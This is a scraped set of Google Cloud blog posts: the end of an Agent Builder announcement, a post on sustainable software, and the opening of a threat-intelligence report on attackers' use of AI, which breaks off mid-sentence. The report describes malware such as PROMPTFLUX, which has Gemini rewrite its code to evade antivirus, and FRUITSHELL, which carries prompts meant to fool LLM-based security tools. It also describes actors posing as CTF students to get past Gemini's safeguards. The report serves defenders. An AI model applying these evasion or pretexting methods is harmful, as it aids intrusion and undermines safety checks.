Cloud IAM capabilities, we are giving agents their own unique, </span><strong style=\"vertical-align: baseline;\">native identities</strong><span style=\"vertical-align: baseline;\"> within Google Cloud. As first-class</span> <a href=\"https://cloud.google.com/iam/docs/principals-overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">IAM principals</span></a><span style=\"vertical-align: baseline;\">, agent identities allow you to enforce true least-privilege access, establish granular policies, and resource boundaries to meet your compliance and governance requirements.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Safeguards and advanced security:</strong><span style=\"vertical-align: baseline;\"> Existing protections are already available to protect and secure AI applications. </span><a href=\"https://docs.cloud.google.com/security-command-center/docs/model-armor-overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Model Armor</strong></a><span style=\"vertical-align: baseline;\"> provides protection against input risks like prompt injection, while also screening tool calls and agent responses. For complete control, Model Armor provides built-in inline protection for Gemini models and a REST API to integrate with your agents. To provide full visibility, new integrations with AI Protection in </span><a href=\"https://docs.cloud.google.com/security-command-center/docs\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Security Command Center</strong></a><span style=\"vertical-align: baseline;\"> will discover and inventory agentic assets as well as detect agentic threats such as unauthorized access and data exfiltration attempts by agents.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">As a bonus, agents you build in Agent Builder can be registered for your teams to use directly within </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/introducing-gemini-enterprise?e=48754805?utm_source%3Dlinkedin\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\">.\u00a0</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Below is a mock of a dashboard in Gemini Enterprise, showing how custom agents built in Agent Builder can be registered and made available to your employees, creating a single place for them to accelerate their workflows.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"3\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/3_nS75AlB.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">How customers are achieving more with Agent Builder</span></h3>\n<p style=\"padding-left: 40px;\"><em><span style=\"vertical-align: baseline;\">\u201cColor Health, with its affiliated medical group Color Medical, operates the nation\u2019s only Virtual Cancer Clinic, delivering clinically guided, end-to-end cancer care across all 50 states, from prevention to survivorship. In partnership with Google Cloud and Google.org, we\u2019re helping more women get screened for breast cancer using an AI-powered agent built with </span><strong style=\"vertical-align: baseline;\">Vertex AI Agent Builder</strong><span style=\"vertical-align: baseline;\"> using </span><strong style=\"vertical-align: baseline;\">ADK powered by Gemini LLMs </strong><span style=\"vertical-align: baseline;\">and scaling them into production with </span><strong style=\"vertical-align: baseline;\">Agent Engine</strong></em><span style=\"vertical-align: baseline;\"><em>. The Color Assistant determines if women are due for a mammogram, connects them with clinicians, and schedules care. The power of the agent lies in the scale it enables, helping us reach more women, collect diverse and context-rich answers, and respond in real time. Early detection saves lives: 1 in 8 women develop breast cancer, yet early detection yields a 99% survival rate. Check it out here: color.com/breast-cancer-screening\u201d </em></span><span style=\"font-style: italic; vertical-align: baseline;\">- </span><span style=\"vertical-align: baseline;\">Jayodita Sanghvi, PhD., Head of AI Platform, Color</span></p>\n<p style=\"padding-left: 40px;\"><em><span style=\"vertical-align: baseline;\">\"PayPal uses </span><strong style=\"vertical-align: baseline;\">Vertex AI Agent Builder</strong><span style=\"vertical-align: baseline;\"> to rapidly build and deploy agents in production. Specifically, we use </span><strong style=\"vertical-align: baseline;\">Agent Development Kit (ADK) CLI and visual tools</strong><span style=\"vertical-align: baseline;\"> to inspect </span><strong style=\"vertical-align: baseline;\">agent</strong><span style=\"vertical-align: baseline;\"> interactions, follow state changes, and manage multi-agent workflows. We leverage the </span><strong style=\"vertical-align: baseline;\">step-by-step visibility</strong><span style=\"vertical-align: baseline;\"> feature for </span><strong style=\"vertical-align: baseline;\">tracing and debugging agent workflows. </strong><span style=\"vertical-align: baseline;\">This lets the team easily</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">trace requests/responses and visualize the flow of intent, cart, and payment mandates. Finally, </span><strong style=\"vertical-align: baseline;\">Agent Payment Protocol (AP2)</strong><span style=\"vertical-align: baseline;\"> on Agent Builder provides us the critical foundation for trusted agent payments. </span><strong style=\"vertical-align: baseline;\">AP2</strong></em><span style=\"vertical-align: baseline;\"><em> helps our ecosystem accelerate the shipping of safe, secure agent-based commerce experiences.\"</em> -</span><span style=\"font-style: italic; vertical-align: baseline;\"> </span><span style=\"vertical-align: baseline;\">Nitin Sharma, Principal Engineer, AI</span></p>\n<p style=\"padding-left: 40px;\"><em><span style=\"vertical-align: baseline;\">\u201cGeotab uses </span><strong style=\"vertical-align: baseline;\">Vertex AI Agent Builder</strong><span style=\"vertical-align: baseline;\"> to rapidly build and deploy agents in production. Specifically, we use Google's </span><strong style=\"vertical-align: baseline;\">Agent Development Kit (ADK)</strong></em><span style=\"vertical-align: baseline;\"><em> as the framework for our AI Agent Center of Excellence. It provides the flexibility to orchestrate various frameworks under a single, governable path to production, while offering an exceptional developer experience that dramatically accelerates our build-test-deploy cycle. For Geotab, ADK is the foundation that allows us to rapidly and safely scale our agentic AI solutions across the enterprise\u201d</em> - <span style=\"vertical-align: baseline;\">Mike Branch, Vice President, Data &amp; Analytics</span></span></p>\n<h3><span style=\"vertical-align: baseline;\">Get started</span></h3>\n<p><a href=\"https://cloud.google.com/products/agent-builder?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI Agent Builder</span></a><span style=\"vertical-align: baseline;\"> provides the unified platform to manage the entire agent lifecycle, helping you close the gap from prototype to a production-ready agent. To explore these new features, visit the updated </span><a href=\"https://cloud.google.com/agent-builder/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Builder documentation</span></a><span style=\"vertical-align: baseline;\"> to learn more.</span></p>\n<p><span style=\"vertical-align: baseline;\">If you\u2019re a startup and you\u2019re interested in learning more about building and deploying agents, download the </span><a href=\"https://goo.gle/3KjHdiW\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Startup Technical Guide: AI Agents</span></a><span style=\"vertical-align: baseline;\">. This guide provides the knowledge needed to go from an idea to prototype to scale, whether your goals are to automate tasks, enhance creativity, or launch entirely new user experiences for your startup.</span></p></div>",
        "published_date": "2025-11-05 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/sustainability/building-software-sustainably/",
        "title": "Build software sustainably in the AI era",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/Build_Software_Sustainably_blog_header.max-600x600.png",
        "author": "John Abel",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Artificial intelligence is reshaping our world \u2013 accelerating discovery, optimising systems, and unlocking new possibilities across every sector. But with its vast potential comes a shared responsibility.</span></p>\n<p><span style=\"vertical-align: baseline;\">AI can be a powerful ally for transforming businesses and reducing cost. It can help organizations minimize carbon emissions, industries manage energy use, and scientists model complex climate systems in real time. Yet the way we design, deploy, and run AI also matters. Building software sustainably means making every stage of the digital journey \u2013 from architecture to inference \u2013 more efficient, transparent, and resilient.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Innovation that serves sustainability</span></h3>\n<p><span style=\"vertical-align: baseline;\">At Google, we believe innovation and sustainability go hand in hand. The same intelligence that powers breakthroughs can also help us use resources more wisely.</span></p>\n<p><span style=\"vertical-align: baseline;\">Projects like </span><strong style=\"vertical-align: baseline;\">Green Light</strong><span style=\"vertical-align: baseline;\">, which uses AI to optimise traffic signals and reduce emissions, and </span><strong style=\"vertical-align: baseline;\">Project Contrails</strong><span style=\"vertical-align: baseline;\">, which helps airlines cut the warming effects of condensation trails, show what happens when technology serves both performance and planet.</span></p>\n<p><span style=\"vertical-align: baseline;\">Each example reveals a helpful truth \u2013 that sustainability doesn\u2019t slow innovation but instead fuels it, enabling efficiency to become an engine of progress.</span></p>\n<h3><span style=\"vertical-align: baseline;\">From footprint to framework</span></h3>\n<p><span style=\"vertical-align: baseline;\">Every software system, including AI, has an environmental footprint \u2013 from the hardware and energy that powers data centers to the water used to cool them. Water is one of the planet\u2019s most precious and increasingly scarce resources and protecting it must be part of any technology strategy. That\u2019s why Google is investing in advanced cooling systems and </span><strong style=\"vertical-align: baseline;\">water stewardship projects</strong><span style=\"vertical-align: baseline;\"> with the goal to replenish more than we consume, helping preserve local ecosystems and community supplies.</span></p>\n<p><span style=\"vertical-align: baseline;\">Understanding this footprint helps engineers and organisations make smarter choices, like selecting efficient accelerators, rightsizing workloads, and scheduling operations when the grid is cleanest.</span></p>\n<p><span style=\"vertical-align: baseline;\">Across Google Cloud, we\u2019re continually improving efficiency. Our Ironwood Tensor Processing Units (TPUs) are nearly 30 times more energy-efficient than our first Cloud TPU from 2018, and our data centres operate at a fleet-wide Power Usage Effectiveness (PUE) of 1.09, which is amongst the best in the world.</span></p>\n<p><span style=\"vertical-align: baseline;\">By designing systems that consume less energy and run on more carbon-free power, we help close the gap between </span><span style=\"font-style: italic; vertical-align: baseline;\">ambition and action</span><span style=\"vertical-align: baseline;\"> \u2013 turning digital progress into tangible emissions reductions.</span></p>\n<p><span style=\"vertical-align: baseline;\">But this isn\u2019t achieved through infrastructure alone. It\u2019s the result of decisions made at every layer of the software lifecycle. That\u2019s why we encourage teams to think </span><span style=\"font-style: italic; vertical-align: baseline;\">Sustainable by Design</span><span style=\"vertical-align: baseline;\">, bringing efficiency, measurement, and responsibility into every stage of building software.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Sustainable by Design: a mindset for the AI era</span></h3>\n<p><span style=\"vertical-align: baseline;\">Today\u2019s sustainability questions aren't coming just from sustainability teams; they are coming directly from executives, financial operations teams, technology leads and developers. And they are often asking sustainability questions using infrastructure language:</span><span style=\"font-style: italic; vertical-align: baseline;\"> \"Are we building the most price-performant AND efficient way to run AI?\"</span><span style=\"vertical-align: baseline;\"> This is not a niche environmental question; it's relevant across -industries, across-geo\u2019s and it requires that leaders consider sustainability criteria when they are designing infrastructure.\u00a0 </span><span style=\"vertical-align: baseline;\">A Sustainable by Design infrastructure strategy makes AI training and operation dramatically more cost- and energy-efficient. It\u2019s built around a set of principles known as the </span><strong style=\"vertical-align: baseline;\">4Ms</strong><span style=\"vertical-align: baseline;\"> which lay out powerful ways to embed efficiency into software:</span></p>\n<ol>\n<li><strong style=\"vertical-align: baseline;\">Machine </strong><span style=\"vertical-align: baseline;\">- choose efficient computing resources that deliver more performance per watt.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Model </strong><span style=\"vertical-align: baseline;\">- use or adapt existing models rather than starting from scratch \u2014 smaller, fine-tuned models can be faster and more resource efficient.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Mechanisation </strong><span style=\"vertical-align: baseline;\">- automate data and AI operations through serverless and managed services to minimise idle compute.</span></li>\n<li><strong style=\"vertical-align: baseline;\">Map </strong><span style=\"vertical-align: baseline;\">- run workloads where and when the energy supply is cleanest.</span></li>\n</ol>\n<p><span style=\"vertical-align: baseline;\">The 4Ms help turn sustainability into a design principle, and a shared responsibility across every role in tech.\u00a0</span></p>\n<h3><span style=\"vertical-align: baseline;\">A collective journey toward resilience</span></h3>\n<p><span style=\"vertical-align: baseline;\">As we host the AI Days in the Nordics, the conversation about AI\u2019s environmental impact is accelerating, and so is the opportunity to act. Every software team, cloud architect, and product manager has a role to play in designing a digital ecosystem that enables and fuels innovation without compromising environmental impact.</span></p>\n<p><span style=\"vertical-align: baseline;\">Building software sustainably is essential for business resilience \u2013AI applications that use fewer resources are not only more energy efficient; they're scalable, and cost-effective for the organisations that depend on them.</span></p>\n<p><span style=\"vertical-align: baseline;\">To learn more about how we can make the future sustainable by design, download our </span><a href=\"https://www.gstatic.com/bricks/pdf/c2a8e9ed-01b4-442a-94fe-d084fc8f9bbe/Google%20Cloud%20Build%20Software%20Sustainably%202025.pdf\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Build Software Sustainably ebook</strong></a><strong style=\"vertical-align: baseline;\">.</strong></p></div>",
        "published_date": "2025-11-05 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools/",
        "title": "GTIG AI Threat Tracker: Advances in Threat Actor Usage of AI Tools",
        "thumbnail": null,
        "author": "Google Threat Intelligence Group",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Executive Summary</span></h3>\n<p><span style=\"vertical-align: baseline;\">Based on recent analysis of the broader threat landscape, Google Threat Intelligence Group (GTIG) has identified a shift that occurred within the last year: adversaries are no longer leveraging artificial intelligence (AI) just for productivity gains, they are deploying </span><strong style=\"vertical-align: baseline;\">novel AI-enabled malware in active operations</strong><span style=\"vertical-align: baseline;\">. This marks a new operational phase of AI abuse, involving tools that dynamically alter behavior mid-execution.</span></p>\n<p><span style=\"vertical-align: baseline;\">This report serves as an update to our January 2025 analysis, \"</span><a href=\"https://cloud.google.com/blog/topics/threat-intelligence/adversarial-misuse-generative-ai\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Adversarial Misuse of Generative AI</span></a><span style=\"vertical-align: baseline;\">,\" and details how government-backed threat actors and cyber criminals are integrating and experimenting with AI across the industry throughout the entire attack lifecycle. Our findings are based on the broader threat landscape.</span></p>\n<p><span style=\"vertical-align: baseline;\">At Google, we are committed to developing AI responsibly and take proactive steps to disrupt malicious activity by disabling the projects and accounts associated with bad actors, while continuously improving our models to make them less susceptible to misuse. We also proactively share industry best practices to arm defenders and enable stronger protections across the ecosystem. Throughout this report we\u2019ve noted steps we\u2019ve taken to thwart malicious activity, including disabling assets and applying intel to strengthen both our classifiers and model so it\u2019s protected from misuse moving forward. Additional details on how we\u2019re protecting and defending Gemini can be found in this white paper</span><span style=\"vertical-align: baseline;\">, \u201c</span><a href=\"https://deepmind.google/discover/blog/advancing-geminis-security-safeguards/\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Advancing Gemini\u2019s Security Safeguards</span></a><span style=\"vertical-align: baseline;\">.\u201d </span></p></div>\n<div class=\"block-aside\"><dl>\n    <dt>aside_block</dt>\n    <dd>&lt;ListValue: [StructValue([(&#x27;title&#x27;, &#x27;GTIG AI Threat Tracker: Advances in Threat Actor Usage of AI Tools&#x27;), (&#x27;body&#x27;, &lt;wagtail.rich_text.RichText object at 0x7fe158e79340&gt;), (&#x27;btn_text&#x27;, &#x27;Download now&#x27;), (&#x27;href&#x27;, &#x27;https://services.google.com/fh/files/misc/advances-in-threat-actor-usage-of-ai-tools-en.pdf&#x27;), (&#x27;image&#x27;, &lt;GAEImage: misuse of AI 2 cover&gt;)])]&gt;</dd>\n</dl></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--small\n      \n      \n        h-c-grid__col\n        \n        \n        h-c-grid__col--2 h-c-grid__col--offset-5\n      \">\n\n      \n      \n        \n        <img alt=\"misuse of AI 2 key\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-key.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">Key Findings</span></h3>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">First Use of \"Just-in-Time\" AI in Malware:</strong><span style=\"vertical-align: baseline;\"> For the first time, GTIG has identified malware families, such as </span><strong style=\"vertical-align: baseline;\">PROMPTFLUX</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">PROMPTSTEAL</strong><span style=\"vertical-align: baseline;\">, that use Large Language Models (LLMs) during execution. These tools dynamically generate malicious scripts, obfuscate their own code to evade detection, and leverage AI models to create malicious functions on demand, rather than hard-coding them into the malware. While still nascent, this represents a significant step toward more autonomous and adaptive malware.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">\"Social Engineering\" to Bypass Safeguards:</strong><span style=\"vertical-align: baseline;\"> Threat actors are adopting social engineering-like pretexts in their prompts to bypass AI safety guardrails. We observed actors posing as students in a \"capture-the-flag\" competition or as cybersecurity researchers to persuade Gemini to provide information that would otherwise be blocked, enabling tool development.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Maturing Cyber Crime Marketplace for AI Tooling:</strong><span style=\"vertical-align: baseline;\"> The underground marketplace for illicit AI tools has matured in 2025. We have identified multiple offerings of multifunctional tools designed to support phishing, malware development, and vulnerability research, lowering the barrier to entry for less sophisticated actors.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Continued Augmentation of the Full Attack Lifecycle:</strong><span style=\"vertical-align: baseline;\"> State-sponsored actors including from North Korea, Iran, and the People's Republic of China (PRC) continue to misuse Gemini to enhance all stages of their operations, from reconnaissance and phishing lure creation to command and control (C2) development and data exfiltration.</span></p>\n</li>\n</ul>\n<h3><span style=\"vertical-align: baseline;\">Threat Actors Developing Novel AI Capabilities\u00a0</span></h3>\n<p><span style=\"vertical-align: baseline;\">For the first time in 2025, GTIG discovered a code family that employed AI capabilities mid-execution to dynamically alter the malware\u2019s behavior. Although some recent implementations of novel AI techniques are experimental, they provide an early indicator of how threats are evolving and how they can potentially integrate AI capabilities into future intrusion activity. Attackers are moving beyond \"vibe coding\" and the baseline observed in 2024 of using AI tools for technical support. We are only now starting to see this type of activity, but expect it to increase in the future.</span></p></div>\n<div class=\"block-paragraph_advanced\"><div align=\"left\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\">\n<div style=\"color: #5f6368; width: 100%;\"><table><colgroup><col /><col /><col /><col /></colgroup>\n<tbody>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Malware</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Function</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Description</strong></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p style=\"text-align: center;\"><strong style=\"vertical-align: baseline;\">Status</strong></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><a href=\"https://www.virustotal.com/gui/file/f8f5e0440c57c7deffd75ca33e2511867039796aa803e7ef847396a379188a7d\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">FRUITSHELL</span></a></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Reverse Shell</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Publicly available reverse shell written in PowerShell that establishes a remote connection to a configured command-and-control server and allows a threat actor to execute arbitrary commands on a compromised system. Notably, this code family contains hard-coded prompts meant to bypass detection or analysis by LLM-powered security systems.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed in operations</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><a href=\"https://www.virustotal.com/gui/file/eb0687daed29f3651c61b0a2aa4a0cdcf2049a1ebae2e15e2dd9326471d318a1\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PROMPTFLUX</span></a></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Dropper</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Dropper written in VBScript that decodes and executes an embedded decoy installer to mask its activity. Its primary capability is regeneration, which it achieves by using the Google Gemini API. It prompts the LLM to rewrite its own source code, saving the new, obfuscated version to the Startup folder to establish persistence. PROMPTFLUX also attempts to spread by copying itself to removable drives and mapped network shares.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Experimental</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><a href=\"https://www.virustotal.com/gui/file/e24fe0dd0bf8d3943d9c4282f172746af6b0787539b371e6626bdb86605ccd70\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PROMPTLOCK</span></a></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Ransomware</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Cross-platform ransomware written in Go, identified as a proof of concept. It leverages an LLM to dynamically generate and execute malicious Lua scripts at runtime. Its capabilities include filesystem reconnaissance, data exfiltration, and file encryption on both Windows and Linux systems.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Experimental</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><a href=\"https://www.virustotal.com/gui/file/766c356d6a4b00078a0293460c5967764fcd788da8c1cd1df708695f3a15b777\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">PROMPTSTEAL</span></a></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Data Miner</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Data miner written in Python and packaged with PyInstaller. It contains a compiled script that uses the Hugging Face API to query the LLM Qwen2.5-Coder-32B-Instruct to generate one-line Windows commands. Prompts used to generate the commands indicate that it aims to collect system information and documents in specific folders. PROMPTSTEAL then executes the commands and sends the collected data to an adversary-controlled server.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed in operations</span></p>\n</td>\n</tr>\n<tr>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><a href=\"https://www.virustotal.com/gui/file/8eea1f65e468b515020e3e2854805f1ef5c611342fa23c4b31d8ed3374286a90\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">QUIETVAULT</span></a></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Credential Stealer</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Credential stealer written in JavaScript that targets GitHub and NPM tokens. Captured credentials are exfiltrated via creation of a publicly accessible GitHub repository. In addition to these tokens, QUIETVAULT leverages an AI prompt and on-host installed AI CLI tools to search for other potential secrets on the infected system and exfiltrate these files to GitHub as well.</span></p>\n</td>\n<td style=\"vertical-align: middle; border: 1px solid #000000; padding: 16px;\">\n<p><span style=\"vertical-align: baseline;\">Observed in operations</span></p>\n</td>\n</tr>\n</tbody>\n</table></div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n</div>\n<div align=\"left\" style=\"text-align: center;\"><span style=\"color: #5f6368; display: block; font-size: 16px; font-style: italic; margin-top: 8px; width: 100%;\">Table 1: Overview of malware with novel AI capabilities GTIG detected in 2025</span></div></div>\n<div class=\"block-paragraph_advanced\"><h4><span style=\"vertical-align: baseline;\">Experimental Malware Using Gemini for Self-Modification to Evade Detection</span></h4>\n<p><span style=\"vertical-align: baseline;\">In early June 2025, GTIG identified experimental dropper malware tracked as PROMPTFLUX that suggests threat actors are experimenting with LLMs to develop dynamic obfuscation techniques. PROMPTFLUX is written in VBScript and interacts with Gemini's API to request specific VBScript obfuscation and evasion techniques to facilitate \"just-in-time\" self-modification, likely to evade static signature-based detection.</span></p>\n<p><span style=\"vertical-align: baseline;\">Further examination of PROMPTFLUX samples suggests this code family is currently in a development or testing phase since some incomplete features are commented out and a mechanism exists to limit the malware's Gemini API calls. The current state of this malware does not demonstrate an ability to compromise a victim network or device. We have taken action to disable the assets</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">associated with this activity.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">The most novel component of PROMPTFLUX is its \"Thinking Robot\" module, designed to periodically query Gemini to obtain new code for evading antivirus software. This is accomplished using a hard-coded API key to send a POST request to the Gemini API endpoint. The actor specifies the use of the \"</span><code style=\"vertical-align: baseline;\">gemini-1.5-flash-latest</code><span style=\"vertical-align: baseline;\">\" model; the \"</span><code style=\"vertical-align: baseline;\">-latest</code><span style=\"vertical-align: baseline;\">\" tag ensures the malware always calls the most current stable release, making the tool more resilient to model deprecation. The prompt sent to the LLM is highly specific and machine-parsable, requesting VBScript code for antivirus evasion and instructing the LLM to output only the code itself.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Although the self-modification function (</span><code style=\"vertical-align: baseline;\">AttemptToUpdateSelf</code><span style=\"vertical-align: baseline;\">) is commented out, its presence, combined with the active logging of AI responses to \"</span><code style=\"vertical-align: baseline;\">%TEMP%\\thinking_robot_log.txt</code><span style=\"vertical-align: baseline;\">\", clearly indicates the author's goal of creating a metamorphic script that can evolve over time.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"VBS &quot;StartThinkingRobot&quot; function\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/misuse-of-ai-two-fig1.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>Figure 1: VBS \"StartThinkingRobot\" function</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">We identified multiple variations of PROMPTFLUX using LLM-driven code regeneration, including one with the \"Thinking Robot\" function replaced with a new \"Thinging\" function. This function leverages a prompt to instruct the Gemini API to rewrite the malware's entire source code on an hourly basis to evade detection. The prompt directs the LLM to act as an \"expert VBScript obfuscator,\" ensuring the new variant remains viable by embedding the original decoy payload, the hard-coded API key, and the complete self-regeneration logic, thereby establishing a recursive cycle of mutation.</span></p>\n<p><span style=\"vertical-align: baseline;\">Although unattributed to a specific threat actor, the filenames associated with PROMPTFLUX highlight behaviors commonly associated with financially motivated actors. Specifically, varied social engineering lures including \"</span><code style=\"vertical-align: baseline;\">crypted_ScreenRec_webinstall</code><span style=\"vertical-align: baseline;\">\" highlight a broad, geography- and industry-agnostic approach designed to trick a wide range of users.</span></p>\n<p><span 